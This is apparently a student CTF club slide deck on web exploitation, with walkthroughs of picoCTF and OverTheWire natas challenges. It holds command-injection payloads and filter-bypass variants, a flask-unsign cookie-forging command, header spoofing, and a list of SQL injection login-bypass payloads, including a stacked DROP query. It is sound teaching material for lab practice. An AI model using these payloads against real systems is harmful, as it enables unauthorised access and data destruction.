---

title: Databased CTF-Quest
author: Anirudh Gupta, Aditya Arsh & Databased team
sub_title: Web Exploitation

---

## Last time
We looked at Binary Files, Reverse Engineering and Binary Exploits. 

<!--pause -->
## Today
<!--pause -->
We will be doing some Web Exploitation. We will be looking at examples as well as be practising from various websites, whose links are mentioned in CTF-Quest Repository. 

<!-- end_slide-->
### What is Web Exploitation
<!-- pause-->
Well, to us, finding flags which are hidden in some parts of website, may it be in HTML, CSS, JS, PHP, etc. scripts or cookies, digging in websites, finding vulnerabilities in websites databases, etc.
<!-- pause -->
But in general, Web exploitation is the process of exploiting vulnerabilities in web-based applications to gain access to sensitive data or control over the app.
<!-- pause-->
# What we will be covering today
<!-- pause-->
1. Understanding The Inspect Element
<!-- pause-->
2. Digging into website files hidden
<!-- pause-->
3. Cookies and tokens like JWT
<!-- pause-->
4. FoxyProxy with Barpsuite
<!-- pause-->
5. Basic SQLi
<!-- end_slide-->
## Inspect Element
<!-- pause-->

This contains all the information that the website page on the spot holds. You can mess around with it like kids, etc.
We will be using Firefox since it has the best Inspect element, user-friendly among Google, Safari and itself. (My opinions).
<!-- pause-->
# Parts of Inspect Element
<!-- pause-->
1. `Inspect(or Inspector)` - Contains information of HTML and CSS which is displayed.
<!-- pause-->
3. `Console Panel:` Provides a space to execute JavaScript commands and log errors or messages.
<!-- pause-->
4. `Sources Panel:` THIS IS IMPORTANT! Allows access to the source files, including HTML, CSS, JavaScript, etc.
<!-- pause-->
5. `Network Panel:` Shows all network requests made by the webpage and their details.
<!-- pause-->
5. `Debugger Panel (Firefox):` Allows you to set breakpoints and step through JavaScript code for debugging.
<!-- pause-->
6. `Application Panel:` Provides information about web storage, service workers, and other application-level resources. VERY IMPORTANT, especially Web Storage has cookies.
<!-- pause-->
7. Other Things exist, you can look into it yourself.
<!-- end_slide -->
## Notes on Inspect Element
<!-- pause -->
The first place to go is in Sources. There see all the codes. In Firefox, their formatting may not be pretty, so press Cmd U (MacOS) or Ctrl U(Non MacOS) to open code in newtab. This is the place to analyse our code.
<!--pause-->
# Java Script Vulnerabilites
<!--pause-->
You may come across JS codes to deal with. Reading them and trying to find vulnerabilities is also important. For example the flag is ciphered in the JS code. But you may need to understand the JS code to know how to decipher it, etc.
<!--pause-->

# HTML & CSS Vulnerabilities
<!--pause-->

They hardly have any vulnerability, only things you can find is written text which you can use as reference. It can be a trick place to hide content cause most times, CSS is useless. 
<!-- end_slide-->
### Example on Inspect element
<!--pause-->

The first example on the link is super simple. Just go to the Inspect Element and look around.
<!--pause-->
# Solution
<!--pause-->

You will find the flag in `style.css`
<!-- end_slide-->
### Problem 1
Please solve the problem. You have 10 min to do this. Time starts now. Link is in the repo!
```bash +exec
for i in $(seq 10 0)
do # TIMER
    echo  "$i minutes left"
    sleep 60
done
```
<!--pause-->
## Hint
<!--pause-->
Where have you seen cowsay before? Your terminal. soooooo....?
<!-- end_slide-->
### Solution 1
<!--pause-->
Well the JS file simply executes a terminal command. But it starts with cowsay, so basically it imitates
<!--pause-->
```shell
$ cowsay <input>
```
<!--pause-->
But we can always do-
<!--pause-->
```shell
$ cowsay hi; ls
```
<!--pause-->
That gives us lots of files with `falg.txt`. Now you can do
<!--pause-->
```shell
$ cowsay hi; cat falg.txt
```
<!--pause-->
And done! 
<!-- end_slide-->
### What if filtering was done?
<!--pause-->
Many a times, filtering is done, so that we can't use `;`, `$`, `|`, etc. So what can we do otherwise. Assume we know which all symbols are filtered. Now we look at various examples we should keep in mind. Let's try it practically too.
<!--pause-->
```bash
hi; ls -la
hi `ls -la`
hi $(ls -la)
hi && ls -la
hi || ls -la
hi * # wildcard
hi ~
hi .*
## File manipulation
hi > "file; ls -la"
## Environment Variable
hi $ENV_VAR
```
<!--pause-->
This is really important, we should know many of these
<!-- end_slide-->

## Digging into websites
1. Some websites have more sources that may not be present in sources. The first place to look is `/robots.txt`.
<!-- pause -->
`robots.txt` is a text file used by websites to communicate with web crawlers and robots, specifying which parts of the site should not be crawled or indexed by search engines.
<!--pause-->
2. You can also look into HTML, JS page for any `php` files. If you have, you can try clicking it and go to its corresponding use case website. You can also try `filename.phps`, this may take its source code. Emphasis on `may`.
<!-- pause -->
3. `sitemap.xml` lists all accessible URLs on the website, useful for finding hidden pages.
<!-- pause -->
4. You can try some places like `/flag.txt` or some name mentioned in the website.
<!-- end_slide-->
### Example of Digging in Websites
<!-- pause-->
While you get a fresh website, first thing is you check the Inspect Element, Cookies, etc. Second thing you do is check robots.txt, sitemaps.xml, etc.
<!-- pause -->
So let's check `/robots.txt`!
<!-- pause -->
You get some ciphered texts and some locations you can check (which turn out to be useless.)
<!-- pause -->
The ciphered texts turn out to be base64 and well you decipher it to get `/js/myfile.txt`. You get there and boom! You are done!
<!-- end_slide-->
### Problem 2
You got the website. Start diggin! Time starts now. This is a series of problem you will face. You have to find the password within 1 of them for the next exercise.
# PLEASE ASK FOR HELP IF YOU FACE ANY ISSUES!
<!-- pause -->
```bash +exec
for i in $(seq 10 0)
do # TIMER
    echo  "$i minutes left"
    sleep 60
done
```

<!-- pause -->
# Hint
<!-- pause -->
See css locations, secrets and hidden keywords are super sus. Try various combinations.
<!-- end_slide-->
### Solution 2
The problems are taken from OverTheWire natas. The link is https://overthewire.org/wargames/natas/
<!-- pause -->
# Rules
<!-- pause -->
1. Password for natas0 is natas0
<!-- pause -->
2. Find password for next natas level within the current website
<!-- pause -->
3. Next website level is (example) http://natas5.natas.labs.overthewire.org/, just change 5 to 6, etc.
<!-- pause -->

**NOTE:** The password may differ for each user but the mathod remains same. Thus these are just the solutions, passwords will not be mentioned.
<!-- pause -->
## Level0 - natas0
<!-- pause -->
Open the Inspect Element, and there you go. You have the password just there. 
<!-- pause -->

## natas1
<!-- pause -->
You can't right click, ok. 
Simply open this FireFox and Cmd U, that will open the Source Code. There you go, the password is just right there.
<!-- pause -->
## natas 2
View source page and find that there’s a folder `/files/` on the web root. Inside this folder there’s a file named as `users.txt`. Open it and find the password.
<!-- pause -->
## natas 3
View source page and find that Not even Google will find it this time. It looks like that there’s something to do with the search engines.

Try to open the `/robots.txt` and find that the website disallows the folder `/s3cr3t/` to be crawled. Open the folder and find the password in the file `user.txt`.

<!-- end_slide-->
## Cookies and Tokens
<!--pause -->
# 1. Inspecting Cookies:
* Open the browser's developer tools (F12).
<!--pause -->
* Navigate to the "Storage" or "Application" tab.
<!--pause -->
* Look for the "Cookies" section to see all cookies set by the website.
<!--pause -->

# 2. Reading Cookie Data:
<!--pause -->
* Examine cookie values for potential hints or encoded data.
<!--pause -->
* Decode any Base64 or URL-encoded strings that might contain hidden information.
<!--pause -->

# 3. Modifying Cookies:
<!--pause -->
* Change cookie values to test different user roles or bypass certain checks.
<!--pause -->
* Save changes and refresh the page to see the effects.
<!--pause -->
* if the cookie name doesn't start with `_`, it's better to not ignore it.

## JWT TOKENS
<!-- pause -->
JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. 
<!-- pause -->
Its structure is-
```markdown
`Header` - Token Type and Algorithm
`Payload` - Data
`Signature` - Verification
```
<!-- pause -->
A JWT token looks like-
```markdown
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
<!--end_slide-->
The decoded version of this token is -
<!-- pause -->
```markdown
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
) secret base64 encoded
```
<!-- pause -->
## How you use them-
<!-- pause -->
1. Go to some Website and see decode it to English.
<!-- pause-->
2. Change them if needed, like `name = admin`
<!-- pause-->
3. You may need to give some signature if required.
<!-- pause-->
4. Give back JWT to website and get more information
<!-- end_slide-->
### Example on Cookies and JWT
<!-- pause-->
Let's see this example which involves the use both cookies and JWT. Ill also introduce a tool caled `flask-unsign`.
<!-- pause-->
# Server.py Interpretation
1. very_auth should become admin.
2. We get a list of cookies to check.

<!-- pause-->
# JWT
When we see the JWT token, it has `very_auth` set to `blank` and we need to set it to admin.
<!-- pause-->
# Flask-unsign
<!-- pause-->
This tool deals a lot with listed cookies, jwt's and much more. We will use the following-
<!-- pause-->
1. Check Which cookie works
```bash
flask-unsign -u --server http://mercury.picoctf.net:18835/ --wordlist cookies.txt
``` 
<!-- pause-->
2. Get the JWT token 
```bash
flask-unsign -s -c "{'very_auth': 'admin'}" -S fortune
```
<!-- pause-->
Now upload the JWT token and you are good to go!
<!-- end_slide-->

### Problem 3
<!-- pause -->
This is the same as before, but a bit easier. Your time starts now- 
<!-- pause -->
```bash +exec
for i in $(seq 5 0)
do # TIMER
    echo  "$i minutes left"
    sleep 60
done
```
<!--pause-->
## Hint:
Search on net for different types of cookies, try putting in one and see how the website cookie changes. Maybe you just need to make some guesses....
<!-- end_slide-->
### Solution 3
Well if you would notice the cookies section, each cookie is given a value, for example wafer cookies have 17. Now you have to change the numbers, refresh and try to find the correct number. 
<!--pause-->
Try manually to get 18 as the payload. A more automated way will be explained after I teach BarpSuite.
<!-- end_slide-->

## Proxy and Barpsuite
<!-- pause -->
This is the most commonly used and the most powerful tool for web exploits. It offers a range of features to help security professionals and penetration testers identify and exploit vulnerabilities in web applications.
<!-- pause-->
### Tools we will use inside Barpsuite
<!-- pause-->
# Proxy 
<!-- pause-->
1. The Proxy tool in Burp Suite intercepts HTTP/S traffic between your browser and the target web application.
<!-- pause-->
2. Allows you to inspect and modify requests and responses on the fly, making it possible to test for vulnerabilities such as SQL injection, XSS, and more by manipulating request parameters.
<!-- pause-->

# Repeater
<!-- pause-->
1. The Repeater tool allows you to manually modify and resend individual HTTP requests to the server.
<!-- pause-->
2. Ideal for detailed testing and fine-tuning of specific requests. For example, you can craft a custom SQL injection payload, send it repeatedly, and observe the response from the server to refine your attack.
<!-- pause-->
# Intruder
<!-- pause-->
1. The Intruder tool is used for automating customized attacks against web applications by sending multiple payloads to various parts of the HTTP request.
<!-- pause-->
2. Useful for performing brute-force attacks, parameter fuzzing, and testing for common vulnerabilities like username enumeration or credential stuffing by automating and iterating over a list of inputs.
<!-- end_slide-->

### Example on BarpSuite
<!-- pause-->
You will understand more practically as I explain how it is used.
<!-- pause-->
This example is MY FAVOURITE question I have ever used Barpsuite for, so ill not give it as a problem, but as an example. Let's open the link in the repo.
<!-- pause-->
We will be facing various obstacles. Search google for them- Example website https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT
<!-- pause -->
Website:
<!-- pause -->
```
User-Agent: PicoBrowser
```
<!-- pause -->
Reference:
<!-- pause -->
```
Referer: https://mercury.picoctf.net:38322
```
<!-- pause -->
Date:
<!-- pause -->
```
Date: Wed, 21 Oct 2018 07:28:00 GMT
```
<!-- pause -->
Do Not Track:
<!-- pause -->
```
DNT: 1
```
<!-- pause -->
Location: https://sweden.se
<!-- pause -->
```
X-Forwarded-For: 102.177.147.255
```
<!-- pause -->
Language
<!-- pause -->
```
Accept-Language: sv-fi # and we are done!
```

<!-- end_slide-->

### Problem 4
<!-- pause -->
The problem is not as elaborate as the previous one. Find the flag. Time starts now!
<!-- pause -->
```bash +exec
for i in $(seq 10 0)
do # TIMER
    echo  "$i minutes left"
    sleep 60
done
```
<!-- pause -->
## Hint
<!-- pause -->
The text that you see has base64 encodings. You need to decipher all the parts of this cipher here and there.

<!-- end_slide-->
### Solution 4
<!-- pause -->
First thing you do, check out the website, as much as you can, inspect, cookies, etc. You will find nothing. Now try BarpSuite. what if you find something.
<!-- pause-->
When you forward the request `username = test` and `password=test!`, you get an id which seems base64.
<!-- pause-->
Highlight it and barpsuite automatically base64 decodes it. This will give `picoCTF{part1`.
 <!-- pause--> 
Forward again, you get another id which is `part2}`. And you are done!
<!-- end_slide-->
## Let's do cookies using BarpSuite
Go to Intruder, we do multiple attacks with this. Manually is just not possible. 
<!-- pause -->
Let's understand how to do this.
<!-- pause -->
# You need to Add where to attack
<!-- end_slide-->

## SQLi
<!-- pause-->
SQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.
<!-- pause-->
```php
<?php
    $username = $_GET['username', 'password']; // Anirudh
    $result = mysql_query("SELECT * FROM users WHERE username='$username' and password ='$password'");
?>
```
<!-- pause-->
If we look at the `$username` variable, under normal operation we might expect the username parameter to be a real username like Anirudh.

But a malicious user might submit different kind of data. For example, consider if the input was '?
The application would crash because the resulting SQL query is incorrect.
<!-- pause-->
```sql
SELECT * FROM users WHERE username = ''' 
```
<!-- pause-->
With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection. What if our input was ' OR 1=1?
<!-- pause-->
```sql
SELECT * FROM users WHERE username='' OR 1=1 -- or true
```
<!-- pause-->
This will basically checking if `password=$password` but we already gave it `True`.

<!-- end_slide-->
## More SQLi
<!-- pause-->
There are various types of SQL, like MySQL, SQLite, PostgreSQL, etc. Everywhere the same thing may not work. So we should know the common ones
<!-- pause-->
# Line comments 
<!-- pause-->
`--` are used for comments everywhere. `#` is used in MySQL. Inline Commenting - `/*Comments Here*/` are also used everywhere for comments.
<!-- pause-->
```sql
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
SELECT /*!32302 1/0, */ 1 FROM tablename 
```
<!-- pause-->
# Stacking Queries
<!-- pause-->
`;` is used in most places for stacking queries, which means you are running another command after `;`.
In below example, we enter id as ` 10; DROP members--`.
<!-- pause-->
```sql
SELECT * FROM products WHERE id = 10; DROP members--
```
<!-- pause-->
You can try `;ls` that may list out files(if such a case occurs), etc.
Their are more examples and patterns to use, but look it up on your own.
<!-- end_slide-->
## List of SQL attacks (basic) you can use
<!-- pause-->
```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
```
```sql 
'; #  
') or '1'='1--
') or ('1'='1--
```
<!-- end_slide-->

### Example I made
<!-- pause -->
Let's a practical example in the real MySQL database i made.
We will see a few SQLi to get a basic picture of what actually happens.
<!-- end_slide-->
### Example 1
<!-- pause -->
Let's see an example of picoCTF, from the repo. I will explain this example. Let's see what's going on.
<!-- pause -->
# First move
The inspect element doesn't give us any lead. So we go to admin login. Now we try various types of SQLi to see which one works.
<!-- pause -->
# SQLi
The general Query looks like
```sql
select * where username='..' and password='..' 
```
<!-- pause -->
We give some shots to password and see nothing works. If we try username, then we see 
`admin'--` works. And we are done.
<!-- end_slide-->
### Example 2
<!-- pause -->
Let's see an example of picoCTF, from the repo. If we try some basic SQLi's, same SQLi works.
But the point of this example is, say you don't understand how to use some SQLi, we can use BarpSuite. 
<!-- pause -->
We see we can turn `debug=1` and we see the Query, this helps us to think about a better SQLi.

<!-- end_slide-->
### Problem 3
Find the perfect SQLi which gets the flag. You might need to use BarpSuite too. Time starts now.
<!-- pause -->
```bash +exec
for i in $(seq 10 0)
do # TIMER
    echo  "$i minutes left"
    sleep 60
done
```
<!-- pause -->
## Hint
<!-- pause -->
why does or turn to be? 
<!-- end_slide-->
### Solution 5
<!-- pause -->
Before analysing the real problem, i check the cookies and we have lots of values.
<!-- pause -->
Thankfully, admin and other are True. Also the jwt token when decoded also give the name admin. So everything's fine in the cookies. (It is important to see them too.)
<!-- pause -->
Now for the real problem, we go to barpsuite and do `debug=1`. This gives us Query which is-
<!-- pause -->
```sql
select * from admin where password='..'
```
<!-- pause -->
Now we can only change password. But as noticed, `or` => `be`. If you put in hello, it becomes `'uryyb'`, which tell us it Caser Cipher with shift 13. So just type `be` to get `or` in the Query.
<!-- pause -->
Thus the answer is -  `' be '1'='1` and we are done.
<!-- end_slide -->
### That's it

<!-- pause -->
```markdown
Thank you everyone for attending this CTF session.
Any Questions?
```
<!-- pause -->
## Summary
<!-- pause -->
# Inspect Element
<!-- pause -->

# Digging around
<!-- pause -->

# Cookies and JWT
<!-- pause -->

# BarpSuite
<!-- pause -->

# SQLi
<!-- pause -->

.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.\
.
### - DATABASED CTF-QUEST
